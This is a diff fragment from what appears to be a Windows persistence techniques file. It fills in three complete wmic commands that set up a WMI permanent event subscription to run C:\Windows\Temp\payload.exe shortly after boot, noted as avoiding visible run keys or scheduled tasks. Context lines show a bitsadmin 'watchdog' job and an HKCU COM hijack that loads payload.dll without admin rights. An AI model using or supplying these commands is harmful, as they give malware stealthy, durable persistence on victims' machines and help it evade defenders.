@@ -149,7 +149,9 @@ bitsadmin /setminretrydelay watchdog 86400  # retry daily
 
 # WMI permanent event subscription
 # Fires on system start without visible run key or scheduled task
-wmic /namespace:"\\root\subscription" path __EventFilter ...
+wmic /namespace:"\\root\subscription" path __EventFilter CREATE Name="BootFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 200 AND TargetInstance.SystemUpTime &lt; 320"
+wmic /namespace:"\\root\subscription" path CommandLineEventConsumer CREATE Name="BootConsumer", ExecutablePath="C:\Windows\Temp\payload.exe", CommandLineTemplate="C:\Windows\Temp\payload.exe"
+wmic /namespace:"\\root\subscription" path __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BootFilter\"", Consumer="CommandLineEventConsumer.Name=\"BootConsumer\""
 
 # COM hijack (HKCU, no admin required)
 HKCU\Software\Classes\CLSID\{GUID}\InprocServer32 = C:\path\to\payload.dll
